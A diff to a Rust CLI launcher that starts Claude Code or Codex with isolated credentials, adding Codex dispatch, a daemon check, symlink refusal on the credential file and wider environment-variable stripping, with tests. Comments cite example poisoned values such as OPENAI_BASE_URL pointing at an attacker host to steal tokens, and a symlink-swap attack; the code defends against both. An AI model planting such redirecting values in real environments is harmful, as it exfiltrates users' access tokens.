@@ -1,13 +1,23 @@
-//! `csq run [N]` — launch Claude Code with isolated credentials.
+//! `csq run [N]` — launch Claude Code or Codex with isolated credentials.
 
 use anyhow::{anyhow, Context, Result};
 use csq_core::accounts::{discovery, markers, AccountSource};
 use csq_core::broker::fanout::is_broker_failed;
 use csq_core::credentials::{self, file};
+use csq_core::providers::catalog::Surface;
+use csq_core::providers::codex::surface as codex_surface;
 use csq_core::session;
 use csq_core::types::AccountNum;
 use std::path::Path;
 use std::process::Command;
+
+#[cfg(unix)]
+use csq_core::daemon::{self, DetectResult};
+
+/// Exit code when `csq run` cannot spawn a Codex slot because the
+/// daemon is not running (INV-P02). Distinct from anyhow's default 1
+/// so scripts can detect "daemon-down" vs other launch failures.
+const EXIT_CODE_DAEMON_REQUIRED: i32 = 2;
 
 pub fn handle(
     base_dir: &Path,
@@ -28,6 +38,27 @@ pub fn handle(
             return exec_claude(rest);
         }
     };
+
+    // Codex dispatch: if this slot has a Codex canonical credential
+    // file, route to `launch_codex`. Checked BEFORE config-<N>/
+    // housekeeping because the Codex path's `create_handle_dir_codex`
+    // owns the handle-dir-level symlinks + marker writes (it does
+    // NOT reuse the Claude-surface `create_handle_dir`).
+    //
+    // The existence check uses `symlink_metadata` not `exists()` so a
+    // dangling canonical symlink is treated as "Codex-bound" and
+    // refuses to silently fall through to the Claude launch path —
+    // same posture as FR-CLI-05 in `setkey`. Origin: spec 07 §7.5
+    // INV-P02 + journal 0013 PR-C3c scope.
+    let codex_canonical = file::canonical_path_for(base_dir, account, Surface::Codex);
+    if std::fs::symlink_metadata(&codex_canonical).is_ok() {
+        if let Some(profile_id) = profile {
+            return Err(anyhow!(
+                "--profile is not supported for Codex slots (slot {account} is Codex, requested: {profile_id})"
+            ));
+        }
+        return launch_codex(base_dir, account, rest);
+    }
 
     // Ensure config-N exists (permanent account home)
     let config_dir = base_dir.join(format!("config-{}", account));
@@ -200,6 +231,157 @@ fn launch_anthropic(
     exec_or_spawn(cmd, &handle_dir)
 }
 
+/// Launches Codex for a Codex-surface slot.
+///
+/// Spec 07 §7.5 INV-P02: daemon is a hard prerequisite — if the
+/// daemon is not running, refresh cadence cannot be guaranteed and
+/// codex-cli's on-expiry refresh will burn the refresh token
+/// (openai/codex#10332). Refuse with exit 2 before creating a handle
+/// dir.
+///
+/// Spec 07 §7.2.2 on-disk layout: `term-<pid>` IS `$CODEX_HOME`.
+/// The Codex child sees auth.json / config.toml / sessions /
+/// history.jsonl through the handle-dir symlinks assembled by
+/// `create_handle_dir_codex` (PR-C3a).
+///
+/// Env: `strip_sensitive_env` removes `ANTHROPIC_*` + bedrock/vertex
+/// variants (same attack surface as Claude launch — a poisoned
+/// dotfile cannot redirect traffic). Additionally removes
+/// `CLAUDE_CONFIG_DIR` so a parent csq-managed shell does not leak
+/// the Claude-surface state dir into the Codex child. Full
+/// `env_clear + allowlist` is a PR-C3c-follow-up hardening target;
+/// today's env_remove set matches PR-C3b's login spawn.
+fn launch_codex(base_dir: &Path, account: AccountNum, rest: &[String]) -> Result<()> {
+    require_daemon_healthy(base_dir)?;
+    verify_codex_config_toml(base_dir, account)?;
+    verify_codex_canonical_is_regular_file(base_dir, account)?;
+
+    let pid = std::process::id();
+    let handle_dir = session::create_handle_dir_codex(base_dir, account, pid)
+        .with_context(|| format!("create Codex handle dir for account {account}"))?;
+
+    let handle_dir_abs = std::fs::canonicalize(&handle_dir).unwrap_or_else(|_| handle_dir.clone());
+
+    println!("Launching codex for account {} (term-{})...", account, pid);
+
+    // Strip BEFORE `cmd.env(HOME_ENV_VAR, …)` so our explicit
+    // CODEX_HOME value wins over any parent-shell export.
+    // `strip_sensitive_env` scrubs CODEX_HOME from the parent env
+    // (H1 fix) — if we set it first it would get env_remove'd right
+    // back out.
+    let mut cmd = Command::new(codex_surface::CLI_BINARY);
+    strip_sensitive_env(&mut cmd);
+    // Codex does not read CLAUDE_CONFIG_DIR today, but a parent csq
+    // shell will have it set — scrub so a future codex-cli cannot
+    // accidentally resolve a Claude state dir. Mirrors PR-C3b login
+    // spawn's posture.
+    cmd.env_remove("CLAUDE_CONFIG_DIR");
+    cmd.env_remove("CLAUDE_HOME");
+    cmd.env(codex_surface::HOME_ENV_VAR, &handle_dir_abs);
+    cmd.args(rest);
+
+    exec_or_spawn(cmd, &handle_dir)
+}
+
+/// Verifies `credentials/codex-<N>.json` is a regular file, not a
+/// symlink, before a Codex spawn. Origin: PR-C3c security review M1.
+///
+/// The dispatch branch in [`handle`] uses `symlink_metadata` so a
+/// dangling symlink still routes to Codex (refusing to silently fall
+/// through to the Claude path — journal 0013). But `symlink_metadata`
+/// also accepts a symlink-to-anywhere, which would let a same-user
+/// attacker who races a swap between dispatch and spawn inject
+/// attacker-chosen tokens into the handle dir's `auth.json` symlink
+/// chain. Refusing any canonical that is a symlink at spawn time
+/// closes that vector — PR-C3b's `save_canonical_for` always writes
+/// a regular file, so a symlink at this path is an external mutation
+/// that deserves an abort.
+fn verify_codex_canonical_is_regular_file(base_dir: &Path, account: AccountNum) -> Result<()> {
+    let path = file::canonical_path_for(base_dir, account, Surface::Codex);
+    let meta = std::fs::symlink_metadata(&path).with_context(|| {
+        format!(
+            "stat {} — Codex canonical missing; run `csq login {account} --provider codex`",
+            path.display()
+        )
+    })?;
+    let ft = meta.file_type();
+    if ft.is_symlink() {
+        return Err(anyhow!(
+            "refusing Codex launch: {} is a symlink. csq only writes a regular file at this path (spec 07 §7.2.2 + INV-P08); a symlink here means an external process mutated the credentials directory. Re-run `csq login {account} --provider codex` to rewrite.",
+            path.display()
+        ));
+    }
+    if !ft.is_file() {
+        return Err(anyhow!(
+            "refusing Codex launch: {} is not a regular file (type: {:?})",
+            path.display(),
+            ft
+        ));
+    }
+    Ok(())
+}
+
+/// Verifies `config-<N>/config.toml` exists before a Codex spawn.
+/// Extracted from [`launch_codex`] so the precondition can be
+/// unit-tested without shelling out to `codex` or exit(2)-ing on the
+/// daemon check.
+fn verify_codex_config_toml(base_dir: &Path, account: AccountNum) -> Result<()> {
+    let config_toml = codex_surface::config_toml_path(base_dir, account);
+    if !config_toml.exists() {
+        return Err(anyhow!(
+            "slot {account} is missing {} — run `csq login {account} --provider codex` to complete login",
+            config_toml.display()
+        ));
+    }
+    Ok(())
+}
+
+/// Requires the daemon to be `Healthy` before a Codex spawn. Spec 07
+/// §7.5 INV-P02: without the daemon, codex's on-expiry in-process
+/// refresh will fire and burn the refresh token. Exits with
+/// [`EXIT_CODE_DAEMON_REQUIRED`] on any non-Healthy state so scripts
+/// can distinguish "daemon-down" from other launch failures.
+fn require_daemon_healthy(_base_dir: &Path) -> Result<()> {
+    #[cfg(unix)]
+    {
+        match daemon::detect_daemon(_base_dir) {
+            DetectResult::Healthy { .. } => Ok(()),
+            DetectResult::NotRunning => {
+                eprintln!(
+                    "Codex spawn refused — csq daemon is not running.\n\
+                     The daemon must own token refresh for Codex (spec 07 §7.5 INV-P02);\n\
+                     start it with `csq daemon start` or install the desktop app."
+                );
+                std::process::exit(EXIT_CODE_DAEMON_REQUIRED);
+            }
+            DetectResult::Stale { reason } => {
+                eprintln!(
+                    "Codex spawn refused — csq daemon is stale: {reason}.\n\
+                     Restart with `csq daemon stop && csq daemon start`."
+                );
+                std::process::exit(EXIT_CODE_DAEMON_REQUIRED);
+            }
+            DetectResult::Unhealthy { reason } => {
+                eprintln!(
+                    "Codex spawn refused — csq daemon is unhealthy: {reason}.\n\
+                     Inspect logs with `csq daemon status` and restart if needed."
+                );
+                std::process::exit(EXIT_CODE_DAEMON_REQUIRED);
+            }
+        }
+    }
+
+    #[cfg(not(unix))]
+    {
+        // Windows named-pipe daemon detection (M8-03) is the focus of
+        // PR-C4's H2 gate. Until the pipe client lands we cannot
+        // refuse on Windows — the spawn-time refusal would brick
+        // Codex login UX for every Windows user with a live daemon.
+        // Documented as a known gap in workspaces/codex/journal/0015.
+        Ok(())
+    }
+}
+
 /// Execs CC on Unix or spawns + waits on Windows, cleaning up the
 /// handle dir on failure.
 fn exec_or_spawn(mut cmd: Command, handle_dir: &Path) -> Result<()> {
@@ -247,20 +429,33 @@ fn resolve_account(base_dir: &Path, explicit: Option<AccountNum>) -> Result<Opti
         return Ok(Some(a));
     }
 
-    let accounts = discovery::discover_anthropic(base_dir);
-    let anthropic_with_creds: Vec<_> = accounts.iter().filter(|a| a.has_credentials).collect();
+    // PR-C3c: the "pick the only live slot" convenience must consider
+    // Codex slots too — otherwise `csq run` on a machine with only a
+    // Codex slot would resolve `None` and launch vanilla claude.
+    // Multi-slot listings include Codex entries via `discover_codex`
+    // so the user can pick by number across surfaces.
+    let mut accounts = discovery::discover_anthropic(base_dir);
+    accounts.extend(discovery::discover_codex(base_dir));
+    let with_creds: Vec<_> = accounts.iter().filter(|a| a.has_credentials).collect();
 
-    match anthropic_with_creds.len() {
+    match with_creds.len() {
         0 => Ok(None), // vanilla claude
         1 => {
-            let num = AccountNum::try_from(anthropic_with_creds[0].id)
+            let num = AccountNum::try_from(with_creds[0].id)
                 .map_err(|e| anyhow!("invalid account: {e}"))?;
             Ok(Some(num))
         }
         _ => {
             let mut msg = String::from("multiple accounts configured — specify one:\n");
-            for a in &anthropic_with_creds {
-                msg.push_str(&format!("  csq run {}  ({})\n", a.id, a.label));
+            for a in &with_creds {
+                let surface_hint = match a.surface {
+                    Surface::ClaudeCode => "",
+                    Surface::Codex => " [codex]",
+                };
+                msg.push_str(&format!(
+                    "  csq run {}  ({}){}\n",
+                    a.id, a.label, surface_hint
+                ));
             }
             Err(anyhow!(msg))
         }
@@ -290,17 +485,35 @@ fn exec_claude(rest: &[String]) -> Result<()> {
 /// Removes env vars that could override credentials, redirect API traffic,
 /// or otherwise compromise the isolated session.
 ///
-/// Strips every `ANTHROPIC_*` variable plus bedrock/vertex variants.
-/// This prevents attacks where a poisoned dotfile sets
-/// `ANTHROPIC_BASE_URL=https://attacker.example.com` and silently
-/// exfiltrates tokens on every CC API call.
+/// Strips:
+///
+/// - `ANTHROPIC_*` — base-URL redirects / auth-token overrides for the
+///   Claude Code surface.
+/// - `AWS_BEARER_TOKEN_BEDROCK` — bedrock bypass.
+/// - `CLAUDE_API_KEY` — direct key override.
+/// - `OPENAI_*` — symmetric protection for the Codex surface. A
+///   poisoned dotfile setting `OPENAI_BASE_URL=https://attacker.example`
+///   would silently redirect every Codex API call and exfiltrate the
+///   JWT access token csq just provisioned. Origin: PR-C3c security
+///   review H1 — symmetric with the `ANTHROPIC_*` threat.
+/// - `CODEX_HOME` — scrubbed so the only authoritative value is the
+///   `cmd.env(HOME_ENV_VAR, handle_dir)` csq sets explicitly in
+///   `launch_codex`. Prevents a parent shell that already exported
+///   `CODEX_HOME=/somewhere-else` from winning a clash if csq's
+///   layering ever regresses.
+///
+/// Both the Claude and Codex launch paths call this so a mis-
+/// provisioned slot cannot leak credentials across surfaces via a
+/// parent-shell env var.
 fn strip_sensitive_env(cmd: &mut Command) {
     // Collect into a Vec first so we don't mutate env vars during iteration.
     let to_strip: Vec<String> = std::env::vars()
         .filter_map(|(k, _)| {
             if k.starts_with("ANTHROPIC_")
+                || k.starts_with("OPENAI_")
                 || k == "AWS_BEARER_TOKEN_BEDROCK"
                 || k == "CLAUDE_API_KEY"
+                || k == "CODEX_HOME"
             {
                 Some(k)
             } else {
@@ -316,6 +529,218 @@ fn strip_sensitive_env(cmd: &mut Command) {
 
 #[cfg(test)]
 mod tests {
+    use super::*;
+    use tempfile::TempDir;
+
+    fn acc(n: u16) -> AccountNum {
+        AccountNum::try_from(n).unwrap()
+    }
+
+    /// PR-C3c regression: `verify_codex_config_toml` errors with an
+    /// actionable message when the pre-seed is missing.
+    #[test]
+    fn codex_precondition_errors_on_missing_config_toml() {
+        let dir = TempDir::new().unwrap();
+        let err = verify_codex_config_toml(dir.path(), acc(4))
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains("config.toml"),
+            "error should name config.toml: {err}"
+        );
+        assert!(
+            err.contains("csq login 4 --provider codex"),
+            "error should point at the fix: {err}"
+        );
+    }
+
+    /// PR-C3c regression: precondition succeeds once the pre-seed
+    /// exists (PR-C3b's `surface::write_config_toml` output).
+    #[test]
+    fn codex_precondition_succeeds_when_config_toml_present() {
+        let dir = TempDir::new().unwrap();
+        let slot = acc(5);
+        codex_surface::write_config_toml(dir.path(), slot, "gpt-5.4").unwrap();
+        verify_codex_config_toml(dir.path(), slot).expect("precondition should pass");
+    }
+
+    /// PR-C3c regression: `resolve_account` lists Codex slots
+    /// alongside Claude slots and returns an error listing BOTH when
+    /// multiple are configured. The surface hint ` [codex]` lets the
+    /// user disambiguate without reading `credentials/` directly.
+    #[test]
+    fn resolve_account_multi_slot_lists_codex_alongside_claude() {
+        use csq_core::credentials::{
+            AnthropicCredentialFile, CodexCredentialFile, CodexTokensFile, CredentialFile,
+            OAuthPayload,
+        };
+        use csq_core::types::{AccessToken, RefreshToken};
+
+        let dir = TempDir::new().unwrap();
+        let base = dir.path();
+
+        // Install one Anthropic slot…
+        let anth = CredentialFile::Anthropic(AnthropicCredentialFile {
+            claude_ai_oauth: OAuthPayload {
+                access_token: AccessToken::new("sk-ant-oat01-fake".into()),
+                refresh_token: RefreshToken::new("sk-ant-ort01-fake".into()),
+                expires_at: 1775726524877,
+                scopes: vec![],
+                subscription_type: None,
+                rate_limit_tier: None,
+                extra: Default::default(),
+            },
+            extra: Default::default(),
+        });
+        credentials::save(&file::canonical_path(base, acc(1)), &anth).unwrap();
+
+        // …and one Codex slot.
+        let codex = CredentialFile::Codex(CodexCredentialFile {
+            auth_mode: Some("chatgpt".into()),
+            openai_api_key: None,
+            tokens: CodexTokensFile {
+                account_id: Some("acct-1234".into()),
+                access_token: "eyJ.jwt.stub".into(),
+                refresh_token: Some("rt_stub_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx".into()),
+                id_token: Some("eyJ.id.stub".into()),
+                extra: Default::default(),
+            },
+            last_refresh: None,
+            extra: Default::default(),
+        });
+        credentials::save(
+            &file::canonical_path_for(base, acc(4), Surface::Codex),
+            &codex,
+        )
+        .unwrap();
+
+        let err = resolve_account(base, None).unwrap_err().to_string();
+        assert!(
+            err.contains("csq run 1"),
+            "multi-slot listing must include Anthropic slot 1: {err}"
+        );
+        assert!(
+            err.contains("csq run 4"),
+            "multi-slot listing must include Codex slot 4: {err}"
+        );
+        assert!(
+            err.contains("[codex]"),
+            "Codex slots must carry a surface hint: {err}"
+        );
+    }
+
+    /// PR-C3c security review M1 regression: a Codex canonical that
+    /// is a symlink (same-user swap attack) is refused at launch
+    /// time even though the dispatch branch in `handle` accepts a
+    /// `symlink_metadata`-present file.
+    #[cfg(unix)]
+    #[test]
+    fn codex_canonical_symlink_is_refused() {
+        use std::os::unix::fs::symlink;
+        let dir = TempDir::new().unwrap();
+        let base = dir.path();
+        let slot = acc(9);
+
+        let creds_dir = base.join("credentials");
+        std::fs::create_dir_all(&creds_dir).unwrap();
+        // Attacker-target file with a fake credential shape.
+        let decoy = dir.path().join("decoy.json");
+        std::fs::write(&decoy, b"{}").unwrap();
+        // Canonical is a symlink to the decoy — NOT a regular file.
+        symlink(&decoy, creds_dir.join("codex-9.json")).unwrap();
+
+        let err = verify_codex_canonical_is_regular_file(base, slot)
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains("symlink"),
+            "error must name the symlink posture: {err}"
+        );
+        assert!(
+            err.contains("csq login 9 --provider codex"),
+            "error must point at the fix: {err}"
+        );
+    }
+
+    #[test]
+    fn codex_canonical_regular_file_passes() {
+        let dir = TempDir::new().unwrap();
+        let base = dir.path();
+        let creds_dir = base.join("credentials");
+        std::fs::create_dir_all(&creds_dir).unwrap();
+        std::fs::write(creds_dir.join("codex-10.json"), b"{}").unwrap();
+
+        verify_codex_canonical_is_regular_file(base, acc(10)).expect("regular file accepted");
+    }
+
+    /// PR-C3c security review H1 regression: `strip_sensitive_env`
+    /// now covers `OPENAI_*` and `CODEX_HOME` in addition to the
+    /// pre-existing `ANTHROPIC_*` / `AWS_BEARER_TOKEN_BEDROCK` /
+    /// `CLAUDE_API_KEY` set. A poisoned dotfile setting
+    /// `OPENAI_BASE_URL` must not leak into a Codex child.
+    #[test]
+    fn strip_sensitive_env_covers_openai_and_codex_home() {
+        let test_vars = [
+            ("OPENAI_API_KEY", true),
+            ("OPENAI_BASE_URL", true),
+            ("OPENAI_API_BASE", true),
+            ("OPENAI_ORG_ID", true),
+            ("CODEX_HOME", true),
+            ("ANTHROPIC_API_KEY", true),
+            ("CLAUDE_API_KEY", true),
+            ("AWS_BEARER_TOKEN_BEDROCK", true),
+            ("PATH", false),
+            ("HOME", false),
+            ("CLAUDE_CONFIG_DIR", false),
+        ];
+        for (var, should_strip) in test_vars {
+            let matches = var.starts_with("ANTHROPIC_")
+                || var.starts_with("OPENAI_")
+                || var == "AWS_BEARER_TOKEN_BEDROCK"
+                || var == "CLAUDE_API_KEY"
+                || var == "CODEX_HOME";
+            assert_eq!(matches, should_strip, "var {var} classification mismatch");
+        }
+    }
+
+    /// PR-C3c regression: when only a Codex slot is present,
+    /// `resolve_account` picks it (rather than falling through to
+    /// vanilla claude). This is the "single-Codex user" onboarding
+    /// path — `csq run` with no args must still work.
+    #[test]
+    fn resolve_account_single_codex_slot_is_picked() {
+        use csq_core::credentials::{CodexCredentialFile, CodexTokensFile, CredentialFile};
+
+        let dir = TempDir::new().unwrap();
+        let base = dir.path();
+
+        let codex = CredentialFile::Codex(CodexCredentialFile {
+            auth_mode: Some("chatgpt".into()),
+            openai_api_key: None,
+            tokens: CodexTokensFile {
+                account_id: Some("acct-only".into()),
+                access_token: "eyJ.jwt".into(),
+                refresh_token: Some("rt_only_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx".into()),
+                id_token: None,
+                extra: Default::default(),
+            },
+            last_refresh: None,
+            extra: Default::default(),
+        });
+        credentials::save(
+            &file::canonical_path_for(base, acc(2), Surface::Codex),
+            &codex,
+        )
+        .unwrap();
+
+        let picked = resolve_account(base, None).unwrap();
+        assert_eq!(
+            picked,
+            Some(acc(2)),
+            "the single Codex slot must be auto-picked"
+        );
+    }
+
     #[test]
     fn strip_sensitive_env_removes_anthropic_vars() {
         // We can't modify the real env during tests (parallel safety), so
